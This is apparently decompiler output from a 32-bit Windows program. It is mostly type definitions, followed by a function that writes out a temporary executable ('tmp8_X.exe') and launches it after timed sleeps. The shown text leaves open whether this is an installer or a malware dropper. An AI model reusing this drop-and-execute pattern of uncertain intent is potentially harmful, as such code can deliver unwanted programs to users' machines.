typedef unsigned char   undefined;

typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined6;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef unsigned short    wchar16;
typedef ulonglong __uint64;

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef int BOOL;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

typedef uchar BYTE;

typedef long LONG;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef int INT_PTR;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

struct HWND__ {
    int unused;
};

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef LONG_PTR LRESULT;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef ulong DWORD;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void *HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

typedef ushort WORD;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

typedef BYTE *LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef char CHAR;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef enum _HEAP_INFORMATION_CLASS {
    HeapCompatibilityInformation=0,
    HeapEnableTerminationOnCorruption=1
} _HEAP_INFORMATION_CLASS;

typedef enum _HEAP_INFORMATION_CLASS HEAP_INFORMATION_CLASS;

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *LPWCH;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef CHAR *LPSTR;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct _strflt _strflt, *P_strflt;

struct _strflt {
    int sign;
    int decpt;
    int flag;
    char *mantissa;
};

typedef enum enum_3272 {
    INTRNCVT_OK=0,
    INTRNCVT_OVERFLOW=1,
    INTRNCVT_UNDERFLOW=2
} enum_3272;

typedef enum enum_3272 INTRNCVT_STATUS;

typedef struct _strflt *STRFLT;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef struct HRSRC__ *HRSRC;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_20 IMAGE_RESOURCE_DIR_STRING_U_20, *PIMAGE_RESOURCE_DIR_STRING_U_20;

struct IMAGE_RESOURCE_DIR_STRING_U_20 {
    word Length;
    wchar16 NameString[10];
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef struct EHRegistrationNode EHRegistrationNode, *PEHRegistrationNode;

struct EHRegistrationNode { // PlaceHolder Structure
};

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;

struct _s_CatchableType { // PlaceHolder Structure
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Structure
};

typedef enum _EXCEPTION_DISPOSITION {
} _EXCEPTION_DISPOSITION;

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

struct _s_FuncInfo { // PlaceHolder Structure
};

typedef struct EHExceptionRecord EHExceptionRecord, *PEHExceptionRecord;

struct EHExceptionRecord { // PlaceHolder Structure
};

typedef struct CatchGuardRN CatchGuardRN, *PCatchGuardRN;

struct CatchGuardRN { // PlaceHolder Structure
};

typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

struct _s_HandlerType { // PlaceHolder Structure
};

typedef struct TranslatorGuardRN TranslatorGuardRN, *PTranslatorGuardRN;

struct TranslatorGuardRN { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct _s_ESTypeList _s_ESTypeList, *P_s_ESTypeList;

struct _s_ESTypeList { // PlaceHolder Structure
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry { // PlaceHolder Structure
};

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Structure
};

typedef struct _LDBL12 _LDBL12, *P_LDBL12;

struct _LDBL12 {
    uchar ld12[12];
};

typedef struct _CRT_FLOAT _CRT_FLOAT, *P_CRT_FLOAT;

struct _CRT_FLOAT {
    float f;
};

typedef struct _CRT_DOUBLE _CRT_DOUBLE, *P_CRT_DOUBLE;

struct _CRT_DOUBLE {
    double x;
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef ushort wint_t;

typedef int errno_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef size_t rsize_t;

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef ushort wctype_t;




void FUN_00401000(HINSTANCE param_1,undefined4 param_2,short *param_3)

{
  short sVar1;
  wchar_t *pwVar2;
  DWORD DVar3;
  int iVar4;
  wchar_t local_420;
  undefined local_41e [518];
  WCHAR aWStack_218 [262];
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)&local_420;
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_00422708,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_00422640,100);
  FUN_004011f0();
  iVar4 = (int)&DAT_00423210 - (int)param_3;
  do {
    sVar1 = *param_3;
    *(short *)(iVar4 + (int)param_3) = sVar1;
    param_3 = param_3 + 1;
  } while (sVar1 != 0);
  DAT_00420f10 = FUN_00403490();
  Sleep(2000);
  iVar4 = FUN_004016a0();
  if (iVar4 != 0) {
    FUN_004037a0();
                    // WARNING: Subroutine does not return
    ExitProcess(0);
  }
  iVar4 = FUN_00401270(param_1);
  if (iVar4 == 0) {
    ___security_check_cookie_4(local_c ^ (uint)&local_420);
    return;
  }
  local_420 = L'\0';
  _memset(local_41e,0,0x206);
  if ((DAT_00422e58 != 0) && (DAT_00422e5c != 0)) {
    FUN_00403420(DAT_00422e58);
    DAT_004214b8 = DAT_00422e5c;
  }
  GetTickCount();
  FUN_00402d50(1000,(wchar_t *)&DAT_00423418,u_tmp8_X_exe_0041c26c);
  FUN_00402240();
  GetModuleFileNameW((HMODULE)0x0,aWStack_218,0x104);
  pwVar2 = _wcsrchr(aWStack_218,L'\\');
  *pwVar2 = L'\0';
  _wcscpy_s(&local_420,0x104,aWStack_218);
  _wcscat_s(&local_420,0x104,(wchar_t *)&DAT_0041c284);
  _wcscat_s(&local_420,0x104,(wchar_t *)&DAT_00423418);
  DVar3 = GetFileAttributesW(&local_420);
  if (DVar3 != 0xffffffff) {
    Sleep(500);
    ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_420,&DAT_0041c400,(LPCWSTR)0x0,1);
  }
  Sleep(5000);
  FUN_00402540();
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



void FUN_004011f0(void)

{
  HINSTANCE in_EAX;
  WNDCLASSEXW local_34;
  
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = FUN_004014a0;
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0;
  local_34.hInstance = in_EAX;
  local_34.hIcon = LoadIconW(in_EAX,(LPCWSTR)0x6b);
  local_34.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_34.hbrBackground = (HBRUSH)0x6;
  local_34.lpszMenuName = (LPCWSTR)0x6d;
  local_34.lpszClassName = (LPCWSTR)&DAT_00422640;
  local_34.hIconSm = LoadIconW(local_34.hInstance,(LPCWSTR)0x6c);
